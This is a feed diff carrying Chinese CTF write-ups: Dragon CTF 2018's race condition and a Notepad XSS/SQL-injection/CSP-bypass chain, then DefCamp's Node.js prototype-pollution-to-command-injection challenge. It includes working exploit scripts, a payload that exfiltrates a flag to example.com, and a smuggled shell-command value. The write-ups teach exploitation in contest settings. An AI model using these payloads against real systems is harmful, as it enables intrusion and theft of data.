+    c3 = c1 ^ c2;
+    // console.log(c1 + &amp;quot; xor &amp;quot;+ c2 + &amp;quot; = &amp;quot;+ c3); // no loggin on prod !
+    window.plaintext += String.fromCharCode(c3)
+    note.val(window.plaintext + window.hex_content.slice(2+pos*2));
+    window.pos += 1
+    window.setTimeout(function(){decode_iter();}, 120);
+  }
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里就解答了我们之前的疑惑，为什么解密的结果是错误的？因为 admin 的密文是用他的密钥加密的，而直接访问该链接只能得到我们直接的密钥，所以解密的结果必然出错。那么我们现在的目的很明确，获得 admin 用户的加密密钥。&lt;/p&gt;
+
+&lt;p&gt;从源码中，我们可以看到有两种途径来获得 key，第一种是直接调用 &lt;code&gt;/note/getkey&lt;/code&gt;，第二种方式则较为间接，我们调用 &lt;code&gt;note/add&lt;/code&gt;，然后发送一大段内容为 &lt;code&gt;\x00&lt;/code&gt; 的文本，由于异或加密的性质，加密后的密文即加密使用的密钥&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&amp;quot;/note/getkey&amp;quot;)
+@loginzone
+def do_note_getkey():
+  return flask.jsonify(dict(
+    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
+  ))
+
+@app.route(&amp;quot;/note/add&amp;quot;, methods=[&#39;POST&#39;])
+@loginzone
+def do_note_add_post():
+  text = get_required_params(&amp;quot;POST&amp;quot;, [&amp;quot;text&amp;quot;])[&amp;quot;text&amp;quot;]
+  key = backend.cache_load(flask.session.sid)
+  if key is None:
+    raise WebException(&amp;quot;Cached key&amp;quot;)
+  text = backend.xor_1337_encrypt(
+    data=text,
+    key=key,
+  )
+  note = model.Notes(
+    username=flask.session[K_LOGGED_USER],
+    message=backend.hex_encode(text),
+  )
+  sql_session.add(note)
+  sql_session.commit()
+  add_msg(&amp;quot;Done !&amp;quot;)
+  return do_render()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;虽然第一种方式更为直接，但后来的测试表明，本题有个很明显的坑在于 key 的长度不止 20 bytes，所以我们必须使用第二种方式来获得 key。&lt;/p&gt;
+
+&lt;p&gt;下一步需要思考如何修改加密的密钥，可以看到程序代码中获得密钥的操作是 &lt;code&gt;backend.cache_load&lt;/code&gt;，而在程序中恰好有另一个函数可以修改 cache：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&#39;/login/user&#39;, methods=[&#39;POST&#39;])
+def do_login_user_post():
+  username = get_required_params(&amp;quot;POST&amp;quot;, [&#39;login&#39;])[&#39;login&#39;]
+  backend.cache_save(
+    sid=flask.session.sid,
+    value=backend.get_key_for_user(username)
+  )
+  state = backend.check_user_state(username)
+  if state &amp;gt; 0:
+    add_msg(&amp;quot;user has {} state code ;/ contact backend admin ... &amp;quot;.format(state))
+    return do_render()
+  flask.session[K_LOGGED_IN] = False
+  flask.session[K_AUTH_USER] = username
+
+  return do_302(&amp;quot;/login/auth&amp;quot;)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以发现我们可以通过传入 &lt;code&gt;login:admin&lt;/code&gt; 的方式将 cache 缓存的密钥修改为 admin 所持有的密钥，然后程序从缓存中读取该密钥进而加密内容，我们就能非常顺利的获得密钥了。但在正常情况下先后调用两个函数是不可能的，因为 &lt;code&gt;do_login_user_post&lt;/code&gt; 会取消用户的登录状态，所以这里就需要利用竞争。&lt;/p&gt;
+
+&lt;p&gt;既然我们清楚这道题的考点是条件竞争，那么写代码就是相当容易的一件事情了：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import threading
+
+s = requests.Session()
+
+def user_login(name):
+    s.post(&#39;http://solution.hackable.software:8080/login/user&#39;, data={&#39;login&#39;:name})
+
+def user_auth(password, token):
+    s.post(&#39;http://solution.hackable.software:8080/login/auth&#39;, data={&#39;password&#39;:password, &#39;token&#39;: token})
+
+def add_note():
+    text = chr(0x00)*160
+    s.post(&#39;http://solution.hackable.software:8080/note/add&#39;,{&#39;text&#39;:text})
+
+def main():
+    while True:
+        user_login(&#39;exec&#39;)
+        user_auth(&#39;exec&#39;, &#39;exec&#39;)
+        t1 = threading.Thread(target=user_login, args=(&#39;admin&#39;,))
+        t2 = threading.Thread(target=add_note)
+        t1.start()
+        t2.start()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view4.png&#34; alt=&#34;view 4&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功获得 admin 的密钥：&lt;code&gt;4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A&lt;/code&gt;，结合密文解密得到 flag：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;notepad&#34;&gt;Notepad&lt;/h2&gt;
+
+&lt;p&gt;本题是基于 express 框架的 nodejs 程序，后端数据库是 PostgreSQL，不过这些都是次要的，本题考点是 xss。&lt;/p&gt;
+
+&lt;p&gt;题目提供了 4 个功能：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;注册&lt;/li&gt;
+&lt;li&gt;登录&lt;/li&gt;
+&lt;li&gt;发布 note&lt;/li&gt;
+&lt;li&gt;查看 note&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;以及你可以 pin 一个 note，或是向管理员报告这个 note，这样管理员就会来查看你发布的 note。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view5.png&#34; alt=&#34;view 5&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看源码，我们可以看到我们之前的输入会以 json 的形式被页面存储，然后页面会调用 &lt;code&gt;notes.js&lt;/code&gt; 动态生成相应内容&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script nonce=&amp;quot;bd08c56c76fc48253d0e8dbd7018ec5b&amp;quot;&amp;gt;window.notes = [{&amp;quot;id&amp;quot;:5001,&amp;quot;title&amp;quot;:&amp;quot;test&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;test&amp;quot;,&amp;quot;pinned&amp;quot;:false}];&amp;lt;/script&amp;gt;
+&amp;lt;script nonce=&amp;quot;bd08c56c76fc48253d0e8dbd7018ec5b&amp;quot; src=&amp;quot;/javascripts/notes.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&#39;use strict&#39;;
+
+$(document).ready(function() {
+  var container = $(&#39;#notes&#39;);
+  var template = $(&#39;#note&#39;).html();
+
+  function createNote(note) {
+    var element = $(template);
+    element.find(&#39;.title&#39;).attr(&#39;href&#39;, &#39;/notes/&#39; + note.id);
+    element.find(&#39;.title&#39;).html(note.title);
+
+    element.find(&#39;.pin&#39;).attr(&#39;action&#39;, &#39;/notes/&#39; + note.id + &#39;/pin&#39;);
+    if (note.pinned) {
+      element.find(&#39;.pin-text&#39;).text(&#39;Unpin&#39;);
+      element.find(&#39;.pin input[name=&amp;quot;value&amp;quot;]&#39;).attr(&#39;value&#39;, &#39;0&#39;);
+    } else {
+      element.find(&#39;.pin-text&#39;).text(&#39;Pin&#39;);
+      element.find(&#39;.pin input[name=&amp;quot;value&amp;quot;]&#39;).attr(&#39;value&#39;, &#39;1&#39;);
+    }
+
+    element.find(&#39;.report&#39;).attr(&#39;href&#39;, &#39;/notes/&#39; + note.id + &#39;/report&#39;);
+    element.find(&#39;.delete&#39;).attr(&#39;action&#39;, &#39;/notes/&#39; + note.id + &#39;/delete&#39;);
+
+    var body = element.find(&#39;.body&#39;);
+    note.content.split(&#39;\n&#39;).forEach(function(text, line) {
+      var el = $(&#39;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&#39;);
+      el.text(text);
+      if (line === 0) el.addClass(&#39;lead&#39;);
+      body.append(el);
+    });
+
+    container.append(element);
+  }
+
+  if (window.notes.length) {
+    window.notes.forEach(createNote);
+  } else {
+    container.append(&amp;quot;&amp;lt;p&amp;gt;You don&#39;t have any notes&amp;lt;/p&amp;gt;&amp;quot;);
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这么现在利用的方式非常明显了，我们需要控制 &lt;code&gt;title&lt;/code&gt; 或者是 &lt;code&gt;content&lt;/code&gt; 在页面中注入相应代码。回到源码上，我们可以看到这一段的逻辑在 &lt;code&gt;/routes/notes.js&lt;/code&gt; 中：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;router.post(&#39;/new&#39;, async (req, res) =&amp;gt; {
+  const regex = /[&amp;lt;&amp;gt;]/;
+
+  let errors = [];
+  if (regex.test(req.body.title)) {
+    errors.push(&#39;Title is invalid&#39;);
+  }
+
+  if (regex.test(req.body.content)) {
+    errors.push(&#39;Content is invalid&#39;);
+  }
+
+  if (errors.length !== 0) {
+    return res.render(&#39;new&#39;, {errors});
+  }
+
+  const result = await req.db.get `INSERT INTO notes (title, content, user_id) VALUES (${req.body.title}, ${req.body.content}, ${req.session.userId}) RETURNING id`;
+  if (result) {
+    return res.redirect(`/notes/${result.id}`);
+  } else {
+    res.render(&#39;new&#39;, {errors: [`Error occurred while saving your note`]});
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到由于正则的存在使得我们无法直接传入相应 payload，因为我们要闭合标签必然要引入尖括号。但这是不是无法解决的呢？在万能的 js 中，一切都是可能的！&lt;/p&gt;
+
+&lt;p&gt;我们注意到 &lt;code&gt;routes/notes.js&lt;/code&gt; 中定义的路由在执行 sql 语句时，存在着一个注入点，所以可以尝试在 &lt;code&gt;req.body.value&lt;/code&gt; 处进行 sql 注入：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;router.post(&#39;/:noteId(\\d+)/pin&#39;, async (req, res) =&amp;gt; {
+  if (req.body.value.length === 1) {
+    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
+    if (result.error) {
+      return res.render(&#39;index&#39;, {errors: [&#39;An error occurred&#39;]});
+    }
+  }
+
+  res.redirect(&#39;/notes&#39;);
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但上述利用点对 &lt;code&gt;value&lt;/code&gt; 的长度有一定限制，不能超过 1，但在这里，我们可以通过将 &lt;code&gt;value&lt;/code&gt; 赋值成数组的方式绕过，因为数组恰好满足了长度为 1 的要求，而且在字符串模板拼接会被自动解包：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const value = [&amp;quot;1::boolean, title=&#39;&amp;lt;/script&amp;gt;&amp;lt;base href=http://example.com/&amp;gt;&#39; WHERE id = 8888--&amp;quot;]
+console.log(`UPDATE notes SET pinned = ${value}::boolean WHERE id = 8888`);
+// output
+// UPDATE notes SET pinned = 1::boolean, title=&#39;&amp;lt;/script&amp;gt;&amp;lt;base href=http://example.com/&amp;gt;&#39; WHERE id = 8888--::boolean WHERE id = 8888
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;既然这里已经确认存在一个 xss 的利用点了，然后下一步就是绕过 CSP 的限制。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.use((req, res, next) =&amp;gt; {
+  res.set(&#39;X-XSS-Protection&#39;, &#39;0&#39;);
+  res.set(&#39;Content-Security-Policy&#39;, `
+    default-src &#39;none&#39;;
+    script-src &#39;nonce-${res.locals.nonce}&#39; &#39;strict-dynamic&#39;;
+    style-src &#39;self&#39; https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
+    img-src &#39;self&#39;;
+    connect-src &#39;self&#39;;
+    frame-src https://www.google.com/recaptcha/;
+    form-action &#39;self&#39;;
+  `.replace(/\n/g, &#39;&#39;));
+  next();
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到 CSP 对我们的脚本做了比较严格的限制，但我们仍然有办法：使用 &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; 标签。根据 &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; 的定义，它可以为页面上的所有链接规定一个默认地址或默认目标，然后浏览器随后将使用指定的基本 URL 来解析所有的相对 URL，包括 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; \ &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 等标签。这样我们就可以将 &lt;code&gt;javascripts/notes.js&lt;/code&gt; 指向部署在我们自己网站上的 payload，例如：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// javascripts/notes.js in our websites
+fetch(&#39;http://nodepad.hackable.software:3000/admin/flag&#39;).then((res) =&amp;gt; {
+    res.text().then((text) =&amp;gt; {
+        location.href = &#39;http://example.com/?flag=&#39; + btoa(text);
+    });
+})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;一波操作：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/postman.png&#34; alt=&#34;Postman&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功获得 flag：&lt;code&gt;DrgnS{Ar3_Y0u_T3mP14t3d?}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;PS: r3kapig 的大佬貌似使用了对象的方式绕过，具体原因大概是数据库操作时会进行的解包操作？感兴趣的朋友可以尝试一下（再告诉我，逃&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;Dargon Sector 不愧是国际强队，出的题目也相当的有质量，使人在做题之余也收获颇丰。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考资料&#34;&gt;参考资料&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/11452&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Nodepad by secse&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2831&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Teaser Dragon CTF 2018 Writeup by r3kapig&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.w3schools.com/tags/tag_base.asp&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;HTML &lt;base&gt; Tag&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;模板字符串&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>从一道 CTF 题看 Node.js 的 prototype pollution attack</title>
+      <link>https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/</link>
+      <pubDate>Tue, 25 Sep 2018 14:50:27 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/</guid>
+      <description>
+
+&lt;blockquote&gt;
+&lt;p&gt;文章首发于先知社区 &lt;a href=&#34;https://xz.aliyun.com/t/2802&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://xz.aliyun.com/t/2802&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;文章的灵感来自于刚刚结束的 DefCamp CTF 2018 上的一道题目，主要的考点是 Node.js 的 prototype pollution attack。因为在 CTF 中 Node.js 的题型较少，同时本人也恰好对其比较感兴趣，所以特地来分析一下这道题的前因后果。&lt;/p&gt;
+
+&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
+
+&lt;p&gt;题目是一个由 Node.js 编写的基于 socket.io 的聊天应用，运行在 &lt;a href=&#34;https://chat.dctfq18.def.camp&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://chat.dctfq18.def.camp&lt;/a&gt; 的 80 端口上，我们可以从 &lt;a href=&#34;https://dctf.def.camp/dctf-18-quals-81249812/chat.zip&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://dctf.def.camp/dctf-18-quals-81249812/chat.zip&lt;/a&gt; 下载源码&lt;/p&gt;
+
+&lt;p&gt;客户端的代码非常简单，分析 client.js 我们可以发现其只是向服务端注册用户并发送消息：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const io = require(&#39;socket.io-client&#39;)
+const socket = io.connect(&#39;https://chat.dctfq18.def.camp&#39;)
+
+if(process.argv.length != 4) {
+  console.log(&#39;name and channel missing&#39;)
+   process.exit()
+}
+console.log(&#39;Logging as &#39; + process.argv[2] + &#39; on &#39; + process.argv[3])
+var inputUser = {
+  name: process.argv[2],
+};
+
+socket.on(&#39;message&#39;, function(msg) {
+  console.log(msg.from,&amp;quot;[&amp;quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&amp;quot;]&amp;quot;, &amp;quot;says:\n&amp;quot;, msg.message);
+});
+
+socket.on(&#39;error&#39;, function (err) {
+  console.log(&#39;received socket error:&#39;)
+  console.log(err)
+})
+
+socket.emit(&#39;register&#39;, JSON.stringify(inputUser));
+socket.emit(&#39;message&#39;, JSON.stringify({ msg: &amp;quot;hello&amp;quot; }));
+socket.emit(&#39;join&#39;, process.argv[3]);//ps: you should keep your channels private
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: process.argv[3], msg: &amp;quot;hello channel&amp;quot; }));
+socket.emit(&#39;message&#39;, JSON.stringify({ channel: &amp;quot;test&amp;quot;, msg: &amp;quot;i own you&amp;quot; }));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以我们需要继续审计服务端的代码，可以看到 server.js 中存在着很一个敏感的函数 &lt;code&gt;getAscii&lt;/code&gt;，在分析了其对应的代码后，可以发现其中存在着一个很明显的命令注入问题：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;getAscii: function(message) {
+    var e = require(&#39;child_process&#39;);
+    return e.execSync(&amp;quot;cowsay &#39;&amp;quot; + message + &amp;quot;&#39;&amp;quot;).toString();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;只要我们构造 &lt;code&gt;message = &amp;quot;aaa&#39;;ls -al; echo &#39;xxx&amp;quot;&lt;/code&gt;，服务器就会将命令 &lt;code&gt;cowsay &#39;aaa&#39;; ls -al; echo &#39;xxx&#39;&lt;/code&gt; 执行后的结果发送给我们。&lt;/p&gt;
+
+&lt;p&gt;那么我们需要关注的下一个问题则是哪里会调用 &lt;code&gt;getAscii&lt;/code&gt; 函数，可以发现服务端会在监听到 join 和 leave 两个事件的时候触发该函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;client.on(&#39;join&#39;, function(channel) {
+    try {
+        clientManager.joinChannel(client, channel);
+        sendMessageToClient(client,&amp;quot;Server&amp;quot;, 
+            &amp;quot;You joined channel&amp;quot;, channel)
+
+        var u = clientManager.getUsername(client);
+        var c = clientManager.getCountry(client);
+
+        sendMessageToChannel(channel,&amp;quot;Server&amp;quot;, 
+            helper.getAscii(&amp;quot;User &amp;quot; + u + &amp;quot; living in &amp;quot; + c + &amp;quot; joined channel&amp;quot;))
+    } catch(e) { console.log(e); client.disconnect() }
+});
+
+client.on(&#39;leave&#39;, function(channel) {
+    try {
+        client .join(channel);
+        clientManager.leaveChannel(client, channel);
+        sendMessageToClient(client,&amp;quot;Server&amp;quot;, 
+            &amp;quot;You left channel&amp;quot;, channel)
+
+        var u = clientManager.getUsername(client);
+        var c = clientManager.getCountry(client);
+        sendMessageToChannel(channel, &amp;quot;Server&amp;quot;, 
+            helper.getAscii(&amp;quot;User &amp;quot; + u + &amp;quot; living in &amp;quot; + c + &amp;quot; left channel&amp;quot;))
+    } catch(e) { console.log(e); client.disconnect() }
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以下一个问题则变成了如何控制变量 &lt;code&gt;u&lt;/code&gt; 或 &lt;code&gt;c&lt;/code&gt;，即用户输入的 username 和 country，但问题是不是这么简单呢？当然不是，服务端会对用户的输入做非常严格的校验：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;validUser: function(inp) {
+    var block = [&amp;quot;source&amp;quot;,&amp;quot;port&amp;quot;,&amp;quot;font&amp;quot;,&amp;quot;country&amp;quot;,
+                    &amp;quot;location&amp;quot;,&amp;quot;status&amp;quot;,&amp;quot;lastname&amp;quot;];
+    if(typeof inp !== &#39;object&#39;) {
+        return false;
+    } 
+
+    var keys = Object.keys(inp);
+    for(var i = 0; i&amp;lt; keys.length; i++) {
+        key = keys[i];
+
+        if(block.indexOf(key) !== -1) {
+            return false;
+        }
+    }
+
+    var r =/^[a-z0-9]+$/gi;
+    if(inp.name === undefined || !r.test(inp.name)) {
+        return false;
+    }
+
+    return true;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到由于正则检查的存在，我们根本无法在 name 属性注入代码，而且由于黑名单的限制，我们也无法直接给 country 属性赋值，那么问题是不是已经陷入僵局了？答案是否定的，天无绝人之路，在这里，我们可以使用 prototype pollution attack 来间接复写 country 属性。&lt;/p&gt;
+
+&lt;p&gt;具体操作如下：
+1. 我们通过给对象的 &lt;code&gt;__proto__&lt;/code&gt; 属性赋值，构造出 &lt;code&gt;{&amp;quot;name&amp;quot;:&amp;quot;xxx&amp;quot;, &amp;quot;__proto__&amp;quot;:{&amp;quot;country&amp;quot;:&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;}}&lt;/code&gt;
+2. 在服务端接收该对象并调用 &lt;code&gt;clone&lt;/code&gt; 函数后，攻击生效。此时访问对象的 country 属性，会得到我们注入的 &lt;code&gt;&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;&lt;/code&gt;
+3. 服务端执行 &lt;code&gt;getAscii&lt;/code&gt; 函数，触发命令注入
+4. 继续改写 payload，成功 get flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142325-824626bc-c08b-1.png&#34; alt=&#34;Get Flag&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;payload&#34;&gt;payload&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const io = require(&#39;socket.io-client&#39;)
+const socket = io.connect(&#39;https://chat.dctfq18.def.camp&#39;)
+
+socket.on(&#39;error&#39;, function (err) {
+  console.log(&#39;received socket error:&#39;)
+  console.log(err)
+})
+
+socket.on(&#39;message&#39;, function(msg) {
+  console.log(msg.from,&amp;quot;[&amp;quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&amp;quot;]&amp;quot;, &amp;quot;says:\n&amp;quot;, msg.message);
+});
+
+socket.emit(&#39;register&#39;, `{&amp;quot;name&amp;quot;:&amp;quot;xxx&amp;quot;, &amp;quot;__proto__&amp;quot;:{&amp;quot;country&amp;quot;:&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;}}`);
+socket.emit(&#39;message&#39;, JSON.stringify({ msg: &amp;quot;hello&amp;quot; }));
+socket.emit(&#39;join&#39;, &#39;xxx&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;问题分析&#34;&gt;问题分析&lt;/h2&gt;
+
+&lt;p&gt;本题的解题思路就到此为止了，但题目背后的 prototype pollution attack 还是非常值得我们思考的。以上题为例，我们来分析一下为什么会触发该攻击。&lt;/p&gt;
+
+&lt;p&gt;可以看到上题中，在收到客户端的数据后，服务端会先调用 JSON.parse 解析用户输入，然后再调用 clone 函数： &lt;code&gt;newUser = helper.clone(JSON.parse(inUser))&lt;/code&gt;，而问题恰好出在 clone 函数上，我们可以编写代码来复现该操作：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function clone(obj) {
+    if (typeof obj !== &#39;object&#39; || obj === null) {
+        return obj;
+    }
+
+    var newObj;
+    var cloneDeep = false;
+
+    if (!Array.isArray(obj)) {
+        if (Buffer.isBuffer(obj)) {
+            newObj = new Buffer(obj);
+        } else if (obj instanceof Date) {
+            newObj = new Date(obj.getTime());
+        } else if (obj instanceof RegExp) {
+            newObj = new RegExp(obj);
+        } else {
+            var proto = Object.getPrototypeOf(obj);
+            if (proto &amp;amp;&amp;amp; proto.isImmutable) {
+                newObj = obj;
+            } else {
+                newObj = Object.create(proto);
+                cloneDeep = true;
+            }
+        }
+    } else {
+        newObj = [];
+        cloneDeep = true;
+    }
+
+    if (cloneDeep) {
+        var keys = Object.getOwnPropertyNames(obj);
+        for (var i = 0; i &amp;lt; keys.length; ++i) {
+            var key = keys[i];
+            var descriptor = Object.getOwnPropertyDescriptor(obj, key);
+            if (descriptor &amp;amp;&amp;amp; (descriptor.get || descriptor.set)) {
+                Object.defineProperty(newObj, key, descriptor);
+            } else {
+                newObj[key] = clone(obj[key]);
+            }
+        }
+    }
+    return newObj;
+}
+
+var payload = &#39;{&amp;quot;__proto__&amp;quot;:{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}}&#39;;
+var oldObj = JSON.parse(payload);
+console.log(oldObj.oops);
+var newObj = clone(oldObj);
+console.log(newObj.oops);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行代码，可以发现在调用 clone 函数之前，我们尝试访问 oldObj 的 oops 属性，得到的结果是 undefined，该属性不存在；但在 clone 后得到的新对象 newObj 中，我们成功访问到了原本不存在的 oops 属性。运行结果如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ node test.js
+undefined
+It works !
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这说明了我们无法在 oldObj 的自有属性或原型链上找到 oops 属性，但可以在 newObj 上找到 oops 属性，那么必然在调用 clone 函数得到 newObj 的时候，newObj 的原型发生了修改，所以我们才能成功访问到 newObj 的 oops 属性。&lt;/p&gt;
+
+&lt;p&gt;追踪函数，可以定位到发生问题的操作在哪：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142829-37bb2d62-c08c-1.png&#34; alt=&#34;Code&#34; title=&#34;Code&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;很明显，在调用 &lt;code&gt;Object.getOwnPropertyNames(obj);&lt;/code&gt; 后获得的键名中存在 &lt;code&gt;__proto__&lt;/code&gt;，因为在这里 &lt;code&gt;__proto__&lt;/code&gt; 属性是 obj 对象的一个普通的自有属性，所以可以被该函数所返回，而一般对象的 &lt;code&gt;__proto__&lt;/code&gt; 属性是不会被该函数所列举出来的。而之后的 &lt;code&gt;newObj[&#39;__proto__&#39;] = clone(obj[&#39;__proto__&#39;]);&lt;/code&gt; 的赋值操作使得 newObj 的原型发生了变化。&lt;/p&gt;
+
+&lt;p&gt;为了加深理解，我们可以继续看下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142910-5003bc0e-c08c-1.png&#34; alt=&#34;prototype&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我们声明了三个 Object，分别是由 JSON.parse 生成的 oldObj，对 oldObj 调用 clone 函数生成的 newObj，以及通过对象字面量直接构造的 oriObj。&lt;/p&gt;
+
+&lt;p&gt;通过对三个对象分别调用 &lt;code&gt;xxx.hasOwnProperty(&#39;__proto__&#39;)&lt;/code&gt; 函数，我们可以发现只有 oldObj 在调用该函数时返回了 true；而在调用 &lt;code&gt;Object.getPrototypeOf(xxx)&lt;/code&gt; 后，只有 newObj 和 oriObj 返回的是 &lt;code&gt;Object {oops: &amp;quot;It works !&amp;quot;}&lt;/code&gt;，oldObj 返回的是 &lt;code&gt;Object {constructor: , __defineGetter__: , __defineSetter__: , hasOwnProperty: , __lookupGetter__: , …}&lt;/code&gt;。这说明 oldObj 的 &lt;code&gt;__proto__&lt;/code&gt; 属性与其余二者不同，并非是指向原型的属性，而是一个普通的自有属性，与其余的自有属性并没有什么区别，只是恰好名字较为敏感。&lt;/p&gt;
+
